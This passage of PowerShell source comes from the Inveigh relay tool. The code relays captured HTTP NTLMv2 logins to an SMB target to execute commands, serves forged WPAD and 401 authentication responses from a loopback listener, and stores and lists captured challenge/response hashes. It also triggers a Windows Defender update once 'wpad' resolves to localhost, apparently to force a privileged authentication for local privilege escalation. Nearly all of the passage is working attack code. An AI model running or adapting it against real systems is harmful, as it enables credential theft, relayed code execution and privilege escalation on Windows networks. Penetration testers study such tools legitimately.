                    if((!$SMBRelayUsernames) -or ($SMBRelayUsernames -contains $HTTP_NTLM_user_string) -or ($SMBRelayUsernames -contains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                    {
                        if(($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            if($inveigh.SMBRelay_failed_list -notcontains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget")
                            {
                                if($NTLM_type -eq 'NTLMv2')
                                {
                                    $inveigh.console_queue.add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")])
                                    $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                                    $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.length]
                    
                                    if((!$SMB_relay_failed) -and ([System.BitConverter]::ToString($SMB_relay_response_return_bytes[9..12]) -eq ('00-00-00-00')))
                                    {
                                        $inveigh.console_queue.add("$HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")])
                                        $inveigh.SMB_relay_active_step = 4
                                        SMBRelayExecute $SMB_relay_socket $SMB_user_ID          
                                    }
                                    else
                                    {
                                        $inveigh.console_queue.add("$HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")])
                                        $inveigh.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                                        $inveigh.SMB_relay_active_step = 0
                                        $SMB_relay_socket.Close()
                                    }
                                }
                                else
                                {
                                    $inveigh.console_queue.add("NTLMv1 relay not yet supported")
                                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NTLMv1 relay not yet supported")])
                                    $inveigh.SMB_relay_active_step = 0
                                    $SMB_relay_socket.Close()
                                }
                            }
                            else
                            {
                                $inveigh.console_queue.add("Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")
                                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")])
                                $inveigh.SMB_relay_active_step = 0
                                $SMB_relay_socket.Close()
                            }
                        }
                        else
                        {
                            $inveigh.console_queue.add("Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")
                            $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")])
                            $inveigh.SMB_relay_active_step = 0
                            $SMB_relay_socket.Close()
                        }
                    }
                    else
                    {
                        $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                    }
                }
            }
            else
            {
                $NTLM = 'NTLM'
            }
        
        }

        $HTTP_timestamp = Get-Date -format r
        $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)

        #$inveigh.response_StatusCode = (0x34,0x30,0x31)
        #$HTTP_response_phrase = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
        
        
        $HTTP_WWW_authenticate_header = (0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20)

        if($NTLM)
        {
            $NTLM = [System.Text.Encoding]::UTF8.GetBytes($NTLM)

            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + $inveigh.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + $HTTP_WWW_authenticate_header`
                + $NTLM`
                + (0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)
        }
        elseif($HTTP_request_type -eq 'WPAD')
        {
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + $inveigh.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x31,0x30,0x37,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)`
                + $HTTP_WPAD_response 
        }
        elseif($HTTP_request_type -eq 'Redirect')
        {
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + $inveigh.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x30,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + $HTTP_location`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)
        }
        else
        {
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x20)`
                + $inveigh.response_StatusCode`
                + (0x20)`
                + $HTTP_response_phrase`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20,0x31,0x30,0x37,0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + $HTTP_timestamp`
                + (0x0d,0x0a,0x0d,0x0a)`
        }


        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
        #$inveigh.response.ContentLength64 = $HTTP_buffer.length
        #$inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
        #$HTTP_stream = $inveigh.response.OutputStream
        $HTTP_stream.write($HTTP_response, 0, $HTTP_response.length)
        $HTTP_stream.Flush()
        start-sleep -s 1
        #}

        #$HTTP_stream.close()

        if(!$inveigh.running -and $inveigh.file_output)
        {
            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
            }
        }

    }

    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

# HTTP/HTTPS Listener Startup Function 
Function HTTPListener()
{
    $inveigh.HTTP_endpoint = New-Object System.Net.IPEndPoint([ipaddress]::loopback,80)
    $inveigh.HTTP_listener = New-Object System.Net.Sockets.TcpListener $inveigh.HTTP_endpoint

    #$inveigh.HTTP_listener.AuthenticationSchemes = "Anonymous" 
    $inveigh.HTTP_listener.Start()
    $HTTP_runspace = [runspacefactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [powershell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_challenge_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument(
        $SMBRelayTarget).AddArgument($SMBRelayCommand).AddArgument($SMBRelayUsernames).AddArgument(
        $SMBRelayAutoDisable).AddArgument($SMBRelayNetworkTimeout).AddArgument(
        $MachineAccounts).AddArgument($WPADAuth) > $null
    $HTTP_handle = $HTTP_powershell.BeginInvoke()
}

# HTTP Server Start
if($inveigh.HTTP -or $inveigh.HTTPS)
{
    HTTPListener
}

if(!$inveigh.running -and $inveigh.console_output)
{

    :console_loop while($inveigh.relay_running -and $inveigh.console_output)
    {
        while($inveigh.console_queue.Count -gt 0)
        {
            if($inveigh.output_stream_only)
            {
                write-output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard ($inveigh.console_queue[0])
                {
                    "*local administrator*"
                    {
                        write-warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "*NTLMv1 challenge/response written*"
                    {
                    if($inveigh.file_output)
                    {
                        write-warning $inveigh.console_queue[0]
                    }
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "*NTLMv2 challenge/response written*"
                    {
                    if($inveigh.file_output)
                    {
                        write-warning $inveigh.console_queue[0]
                    }
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "* relay *"
                    {
                        write-warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "Service *"
                    {
                        write-warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                } 
            } 
              
            if([System.Net.Dns]::GetHostEntry("wpad").AddressList[0].IPAddressToString -eq "127.0.0.1")
            {
                write-output "updating"
                $process_defender = Start-Process -FilePath "C:\Program Files\Windows Defender\MpCmdRun.exe" -Argument SignatureUpdate -NoNewWindow -Wait
            }
        }

        

        if($inveigh.console_input)
        {
            if([console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }
        }

        Start-Sleep -m 5
    }
}

}
#End Invoke-InveighRelay

Function Stop-Inveigh
{
    <#
    .SYNOPSIS
    Stop-InveighRelay will stop all running Inveigh functions.
    #>
    if($inveigh)
    {
        if($inveigh.running -or $inveigh.relay_running)
        {
            $inveigh.running = $false
            $inveigh.relay_running = $false
            
            if($inveigh.HTTP_listener.IsListening)
            {
                $inveigh.HTTP_listener.Stop()
                $inveigh.HTTP_listener.Close()
            }

            $inveigh.status_queue.add("Inveigh exited at $(Get-Date -format 's')")|Out-Null
            $inveigh.log.add("$(Get-Date -format 's') - Inveigh exited")|Out-Null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh exited"| Out-File $Inveigh.log_out_file -Append
            } 
        }
        else
        {
            $inveigh.status_queue.add("Inveigh isn't running") | Out-Null
        }
    
        if($inveigh.HTTPS)
        {
            Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
        
            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificate = $certificate_store.certificates.find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
                $certificate_store.Remove($certificate)
                $certificate_store.Close()
            }
            catch
            {
                $inveigh.status_queue.add("SSL Certificate Deletion Error - Remove Manually")|Out-Null
                $inveigh.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")|Out-Null

                if($inveigh.file_output)
                {
                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"|Out-File $Inveigh.log_out_file -Append   
                }
            }
        }

        $inveigh.HTTP = $false
        $inveigh.HTTPS = $false

    }
    else
    {
        $inveigh.status_queue.add("Inveigh isn't running")|Out-Null
    }

    if($inveigh.status_output)
    {
        while($inveigh.status_queue.Count -gt 0)
        {
            if($inveigh.output_stream_only)
            {
                write-output($inveigh.status_queue[0] + $inveigh.newline)
                $inveigh.status_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard ($inveigh.status_queue[0])
                {
                    "Inveigh exited at *"
                    {
                        write-warning $inveigh.status_queue[0]
                        $inveigh.status_queue.RemoveRange(0,1)
                    }
                    "SSL Certificate Deletion Error - Remove Manually"
                    {
                        write-warning $inveigh.status_queue[0]
                        $inveigh.status_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output $inveigh.status_queue[0]
                        $inveigh.status_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
    }
} 

Function Get-Inveigh
{
    <#
    .SYNOPSIS
    Get-Inveigh will display queued Inveigh output.
    #>
    while($inveigh.console_queue.Count -gt 0)
    {
        if($inveigh.output_stream_only)
        {
            write-output($inveigh.console_queue[0] + $inveigh.newline)
            $inveigh.console_queue.RemoveRange(0,1)
        }
        else
        {
            switch -wildcard ($inveigh.console_queue[0])
            {
                "*local administrator*"
                {
                    write-warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "*NTLMv1 challenge/response written*"
                {
                if($inveigh.file_output)
                {
                    write-warning $inveigh.console_queue[0]
                }
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "*NTLMv2 challenge/response written*"
                {
                if($inveigh.file_output)
                {
                    write-warning $inveigh.console_queue[0]
                }
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "* relay *"
                {
                    write-warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "Service *"
                {
                    write-warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveRange(0,1)
                }
            }
        }    
    }
}

Function Get-InveighNTLM
{
    <#
    .SYNOPSIS
    Get-InveighNTLM will get all captured challenge/response hashes.
    #>
    $inveigh.NTLMv1_list
    $inveigh.NTLMv2_list
}

Function Get-InveighNTLMv1
{
    <#
    .SYNOPSIS
    Get-InveighNTLMv1 will get captured NTLMv1 challenge/response hashes.
    
    .PARAMETER Unique
    Display only the first captured challenge/response for each unique account.
    #>
    param
    ( 
        [parameter(Mandatory=$false)][switch]$Unique,
        [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
    )

    if ($invalid_parameter)
    {
        throw "$($invalid_parameter) is not a valid parameter."
    }

    if($Unique)
    {
        $inveigh.NTLMv1_list.sort()

        foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
        {
            $unique_NTLMv1_account = $unique_NTLMv1.substring(0,$unique_NTLMv1.indexof(":",($unique_NTLMv1.indexof(":")+2)))

            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
            {
                $unique_NTLMv1
            }

            $unique_NTLMv1_account_last = $unique_NTLMv1_account
        }
    }
    else
    {
        $inveigh.NTLMv1_list
    }
}

Function Get-InveighNTLMv2
{
    <#
    .SYNOPSIS
    Get-InveighNTLMv2 will get captured NTLMv1 challenge/response hashes.

    .PARAMETER Unique
    Display only the first captured challenge/response for each unique account.
    #>
    param
    ( 
        [parameter(Mandatory=$false)][switch]$Unique,
        [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
    )

    if ($invalid_parameter)
    {
        throw "$($invalid_parameter) is not a valid parameter."
    }

    if($Unique)
    {
        $inveigh.NTLMv2_list.sort()

        foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
        {
            $unique_NTLMv2_account = $unique_NTLMv2.substring(0,$unique_NTLMv2.indexof(":",($unique_NTLMv2.indexof(":")+2)))

            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
            {
                $unique_NTLMv2
            }

            $unique_NTLMv2_account_last = $unique_NTLMv2_account
        }
    }
    else
    {
        $inveigh.NTLMv2_list
    }
}

Function Get-InveighLog
{
    <#
    .SYNOPSIS
    Get-InveighLog will get log.
    #>
    $inveigh.log
}

Function Get-InveighStats
{
    <#
    .SYNOPSIS
    Get-InveighLog will get log.
    #>
    Write-Output("Total Cleartext Captures = " + $inveigh.cleartext_list.count)
    Write-Output("Total NTLMv1 Captures = " + $inveigh.NTLMv1_list.count)
    Write-Output("Total NTLMv2 Captures = " + $inveigh.NTLMv2_list.count)
}

Function Watch-Inveigh
{
    <#
    .SYNOPSIS
    Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.
    #>
    if($inveigh.tool -ne 1)
    {
        if($inveigh.running -or $inveigh.relay_running)
        {
            Write-Output "Press any key to stop real time console output"
            $inveigh.console_output = $true

            :console_loop while(($inveigh.running) -and ($inveigh.console_output))
            {
                while($inveigh.console_queue.Count -gt 0)
                {
                    if($inveigh.output_stream_only)
                    {
                        write-output($inveigh.console_queue[0] + $inveigh.newline)
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    else
                    {
                        switch -wildcard ($inveigh.console_queue[0])
                        {
                            "*local administrator*"
                            {
                                write-warning $inveigh.console_queue[0]
                                $inveigh.console_queue.RemoveRange(0,1)
                            }
                            "*NTLMv1 challenge/response written*"
                            {
                            if($inveigh.file_output)
                            {
                                write-warning $inveigh.console_queue[0]
                            }
                                $inveigh.console_queue.RemoveRange(0,1)
                            }
                            "*NTLMv2 challenge/response written*"
                            {
                            if($inveigh.file_output)
                            {
                                write-warning $inveigh.console_queue[0]
                            }
                                $inveigh.console_queue.RemoveRange(0,1)
                            }
                            "* relay *"
                            {
                                write-warning $inveigh.console_queue[0]
                                $inveigh.console_queue.RemoveRange(0,1)
                            }
                            "Service *"
                            {
                                write-warning $inveigh.console_queue[0]
                                $inveigh.console_queue.RemoveRange(0,1)
                            }
                            default
                            {
                                write-output $inveigh.console_queue[0]
                                $inveigh.console_queue.RemoveRange(0,1)
                            }
                        }
                    }            
                }

                if([console]::KeyAvailable)
                {
                    $inveigh.console_output = $false
                    BREAK console_loop
                }

                Start-Sleep -m 5
            }
        }
        else
        {
            Write-Output "Inveigh isn't running"
        }
    }
    else
    {
        Write-Output "Watch-Inveigh cannot be used with current external tool selection"
    }
}

Function Clear-Inveigh
{
    <#
    .SYNOPSIS
    Clear-Inveigh will clear Inveigh data from memory.
    #>
    if($inveigh)
    {
        if(!$inveigh.running -and !$inveigh.relay_running)
        {
            Remove-Variable inveigh -scope global
            Write-Output "Inveigh data has been cleared from memory"
        }
        else
        {
            Write-Output "Run Stop-Inveigh before running Clear-Inveigh"
        }
    }
}